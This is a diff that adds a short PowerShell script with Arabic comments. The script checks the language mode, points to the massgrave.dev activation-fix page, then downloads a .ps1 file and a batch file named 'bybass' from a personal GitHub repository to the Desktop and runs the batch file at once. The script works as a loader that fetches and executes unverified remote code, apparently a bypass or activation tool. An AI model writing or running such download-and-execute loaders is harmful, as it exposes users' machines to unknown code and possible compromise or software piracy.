@@ -1,0 +1,29 @@
+# التحقق من وضع لغة PowerShell
+if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
+    Write-Host "❌ PowerShell لا يعمل في الوضع الكامل!" -ForegroundColor Red
+    Write-Host "🔹 لحل المشكلة: https://massgrave.dev/fix_powershell" -ForegroundColor Cyan
+    return
+}
+
+# تحميل الملفات إلى سطح المكتب
+$desktop = [System.Environment]::GetFolderPath("Desktop")
+$files = @(
+    @{url = "https://raw.githubusercontent.com/defeat11/sav2/main/me.ps1"; path = "$desktop\me.ps1"},
+    @{url = "https://raw.githubusercontent.com/defeat11/sav2/main/bybass.bat"; path = "$desktop\me.bat"}
+)
+
+foreach ($file in $files) {
+    try {
+        Invoke-WebRequest -Uri $file.url -OutFile $file.path -UseBasicParsing
+        if (-not (Test-Path $file.path)) { throw "فشل تنزيل $($file.path)" }
+        Write-Host "✅ تم تنزيل: $($file.path)" -ForegroundColor Green
+    } catch {
+        Write-Host "❌ خطأ أثناء تنزيل: $($file.url)" -ForegroundColor Red
+        Write-Host "🔹 تأكد من اتصال الإنترنت أو أن الرابط صحيح." -ForegroundColor Yellow
+        return
+    }
+}
+
+# تشغيل ملف .bat بعد تنزيله
+Start-Process -FilePath "$desktop\me.bat" -Wait
+Write-Host "🚀 تم تشغيل الملف بنجاح!" -ForegroundColor Cyan
